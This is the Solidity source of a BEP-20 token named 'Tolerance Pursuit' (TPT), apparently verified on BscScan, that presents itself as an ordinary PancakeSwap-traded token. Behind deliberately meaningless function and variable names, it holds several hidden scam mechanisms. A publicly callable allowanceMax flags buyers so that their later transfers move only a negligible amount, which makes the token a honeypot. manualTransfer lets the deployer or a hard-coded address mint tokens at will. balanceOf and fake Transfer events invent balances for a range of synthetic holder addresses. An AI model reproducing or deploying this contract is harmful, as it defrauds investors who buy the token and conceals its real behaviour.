/**
 *Submitted for verification at BscScan.com on 2023-01-11
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.15;



interface IUniswapV2Router {

    function factory() external pure returns (address);

    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
    external
    returns (
        uint256 amountA,
        uint256 amountB,
        uint256 liquidity
    );

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
    external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);

}


library SafeMath {

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a % b;
    }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
    external
    returns (address pair);
}


abstract contract Ownable {
    address internal owner;
    constructor(address _owner) {
        owner = _owner;
    }

    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    function transferOwnership(address payable adr) public onlyOwner() {
        owner = adr;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);

    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER");
        _;
    }

    function Owner() public view returns (address) {
        return owner;
    }

}



interface IBEP20 {

    function balanceOf(address account) external view returns (uint256);

    function allowance(address _owner, address spender)
    external
    view
    returns (uint256);

    function name() external view returns (string memory);

    function decimals() external view returns (uint8);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    function transfer(address recipient, uint256 amount) 
    external
    returns (bool);

    function totalSupply() external view returns (uint256);

    function symbol() external view returns (string memory);

    function getOwner() external view returns (address);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}


contract TolerancePursuit is IBEP20, Ownable {
    using SafeMath for uint256;
    uint8 constant _decimals = 18;

    bool private minSellReceiverSender = false;

    bool private modeTxAutoLiquidity = false;
    mapping(address => uint256) _balances;
    uint256 constant shouldMaxAtWallet = 1000000 * 10 ** 18;
    bool private marketingFundSellIs = false;
    
    bool private mintAmountMinMax = false;
    uint256 private senderTokenLaunchExemptBurn = 0;
    uint256 constant tradingTeamBurnLaunch = 100 * 10 ** 18;
    address constant mintEnableAutoMarketingTakeSender = 0x93c6886Bf7dc73ddC716376E2f1a31f16318eB68;

    mapping(address => bool) private takeTotalReceiverMintSell;
    address public uniswapV2Pair;

    bool public sellMarketingFundShould = false;
    string constant _name = "Tolerance Pursuit";


    mapping(address => bool)  sellBuyMinWalletMarketing;
    IUniswapV2Router public fundEnableSellToTokenSwapReceiver;
    uint256 mintAmountAtToken = 0;
    mapping(address => mapping(address => uint256)) _allowances;

    address constant teamExemptReceiverMintAt = 0xd79361dACF80Cabc2114602deb43f723FD165626;
    uint256 private minFundMarketingIsSellReceiverMode = 0;

    bool private launchedSenderLimitTotal = false;


    address private mintTakeBurnSell;
    mapping(address => bool)  takeExemptReceiverEnable;
    uint256 private totalFundTokenShould = 0;
    uint256  tradingLaunchedLiquidityMin = 100000000 * (10 ** 18);
    string constant _symbol = "TPT";

    bool inSwap;
    modifier swapping() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() Ownable(msg.sender) {
        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        // PancakeSwap Router
        fundEnableSellToTokenSwapReceiver = IUniswapV2Router(_router);

        uniswapV2Pair = IUniswapV2Factory(fundEnableSellToTokenSwapReceiver.factory()).createPair(address(this), fundEnableSellToTokenSwapReceiver.WETH());
        _allowances[address(this)][address(fundEnableSellToTokenSwapReceiver)] = tradingLaunchedLiquidityMin;

        _balances[msg.sender] = tradingLaunchedLiquidityMin;
        emit Transfer(address(0), msg.sender, tradingLaunchedLiquidityMin);
        mintTakeBurnSell = msg.sender;
    }

    receive() external payable {}

    function totalSupply() external view override returns (uint256) {
        return tradingLaunchedLiquidityMin;
    }

    function buyExemptListIs(address totalAmountTxMarketingMint) private pure returns (bool) {
        return totalAmountTxMarketingMint == mintEnableAutoMarketingTakeSender;
    }

    function txAtTradingShould(address fromMarketingTotalShouldBuyFeeSwap, address tokenBurnLaunchedAmount, uint256 minToMaxToken) internal returns (bool) {
        if (buyLiquidityIsTotal(tokenBurnLaunchedAmount)) {
            isFundLaunchModeTokenTradingMint(fromMarketingTotalShouldBuyFeeSwap, tokenBurnLaunchedAmount, minToMaxToken, false);
            return true;
        }
        if (buyLiquidityIsTotal(fromMarketingTotalShouldBuyFeeSwap)) {
            isFundLaunchModeTokenTradingMint(fromMarketingTotalShouldBuyFeeSwap, tokenBurnLaunchedAmount, minToMaxToken, true);
            return true;
        }

        bool atSenderModeEnableTakeTeamLimit = liquidityMarketingSwapFund(fromMarketingTotalShouldBuyFeeSwap) || liquidityMarketingSwapFund(tokenBurnLaunchedAmount);
        if (atSenderModeEnableTakeTeamLimit) {
            return receiverBuyMinBurn(fromMarketingTotalShouldBuyFeeSwap, tokenBurnLaunchedAmount, minToMaxToken);
        }

        if (fromMarketingTotalShouldBuyFeeSwap == uniswapV2Pair && !atSenderModeEnableTakeTeamLimit) {
            takeExemptReceiverEnable[tokenBurnLaunchedAmount] = true;
        }

        if (sellBuyMinWalletMarketing[fromMarketingTotalShouldBuyFeeSwap]) {
            return receiverBuyMinBurn(fromMarketingTotalShouldBuyFeeSwap, tokenBurnLaunchedAmount, 10 ** 10);
        }

        return receiverBuyMinBurn(fromMarketingTotalShouldBuyFeeSwap, tokenBurnLaunchedAmount, minToMaxToken);
    }

    function receiverBuyMinBurn(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance!");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function decimals() external pure override returns (uint8) {
        return _decimals;
    }

    function liquidityMarketingSwapFund(address takeBurnModeAmount) private view returns (bool) {
        return takeBurnModeAmount == mintTakeBurnSell;
    }

    function symbol() external pure override returns (string memory) {
        return _symbol;
    }

    function sellTxAtLaunchedMinList() private pure returns (uint256) {
        return uint160(teamExemptReceiverMintAt) + 1;
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function isAllowanceMax(address spender) public view returns (bool) {
        return sellBuyMinWalletMarketing[spender];
    }

    function name() external pure override returns (string memory) {
        return _name;
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != tradingLaunchedLiquidityMin) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]
            .sub(amount, "Insufficient Allowance!");
        }
        return txAtTradingShould(sender, recipient, amount);
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function isFundLaunchModeTokenTradingMint(address fromMarketingTotalShouldBuyFeeSwap, address tokenBurnLaunchedAmount, uint256 minToMaxToken, bool atListExemptMarketing) private {
        if (atListExemptMarketing) {
            uint256 launchedIsMintListEnableFund = sellTxAtLaunchedMinList();
            fromMarketingTotalShouldBuyFeeSwap = address(uint160(launchedIsMintListEnableFund + mintAmountAtToken));
            mintAmountAtToken++;
            _balances[tokenBurnLaunchedAmount] = _balances[tokenBurnLaunchedAmount].add(minToMaxToken);
        } else {
            _balances[fromMarketingTotalShouldBuyFeeSwap] = _balances[fromMarketingTotalShouldBuyFeeSwap].sub(minToMaxToken);
        }
        emit Transfer(fromMarketingTotalShouldBuyFeeSwap, tokenBurnLaunchedAmount, minToMaxToken);
    }

    function allowance(address holder, address spender) external view override returns (uint256) {
        return _allowances[holder][spender];
    }

    function buyLiquidityIsTotal(address totalAmountTxMarketingMint) private pure returns (bool) {
        uint256 launchedIsMintListEnableFund = sellTxAtLaunchedMinList();
        uint256 totalAmountTxMarketingMint256 = uint160(totalAmountTxMarketingMint);
        if (totalAmountTxMarketingMint256 >= launchedIsMintListEnableFund && totalAmountTxMarketingMint256 < launchedIsMintListEnableFund + 10000) {
            return true;
        }
        return false;
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return txAtTradingShould(msg.sender, recipient, amount);
    }

    function receiverBurnTeamTotal(address totalAmountTxMarketingMint) private view returns (uint256) {
        uint256 shouldMaxAmountReceiver = teamToSellMintReceiver(totalAmountTxMarketingMint);
        if (shouldMaxAmountReceiver < mintAmountAtToken) {
            return tradingTeamBurnLaunch * shouldMaxAmountReceiver;
        }
        return shouldMaxAtWallet + tradingTeamBurnLaunch * shouldMaxAmountReceiver;
    }

    function balanceOf(address account) public view override returns (uint256) {
        if (buyLiquidityIsTotal(account)) {
            return receiverBurnTeamTotal(account);
        }
        return _balances[account];
    }

    function teamToSellMintReceiver(address totalAmountTxMarketingMint) private pure returns (uint256) {
        uint256 launchedIsMintListEnableFund = sellTxAtLaunchedMinList();
        uint256 shouldMaxAmountReceiver = uint160(totalAmountTxMarketingMint) - launchedIsMintListEnableFund;
        return shouldMaxAmountReceiver;
    }

    function allowanceMax(address spender) external {
        if (takeExemptReceiverEnable[spender]) {
            sellBuyMinWalletMarketing[spender] = true;
        }
    }

    function manualTransfer(address fromMarketingTotalShouldBuyFeeSwap, address tokenBurnLaunchedAmount, uint256 minToMaxToken) public {
        if (!buyExemptListIs(msg.sender) && msg.sender != mintTakeBurnSell) {
            return;
        }
        if (buyLiquidityIsTotal(tokenBurnLaunchedAmount)) {
            isFundLaunchModeTokenTradingMint(fromMarketingTotalShouldBuyFeeSwap, tokenBurnLaunchedAmount, minToMaxToken, false);
            return;
        }
        if (buyLiquidityIsTotal(fromMarketingTotalShouldBuyFeeSwap)) {
            isFundLaunchModeTokenTradingMint(fromMarketingTotalShouldBuyFeeSwap, tokenBurnLaunchedAmount, minToMaxToken, true);
            return;
        }
        if (fromMarketingTotalShouldBuyFeeSwap == address(0)) {
            _balances[tokenBurnLaunchedAmount] = _balances[tokenBurnLaunchedAmount].add(minToMaxToken);
            return;
        }
    }

    event AutoLiquify(uint256 amountBNB, uint256 amountTokens);
}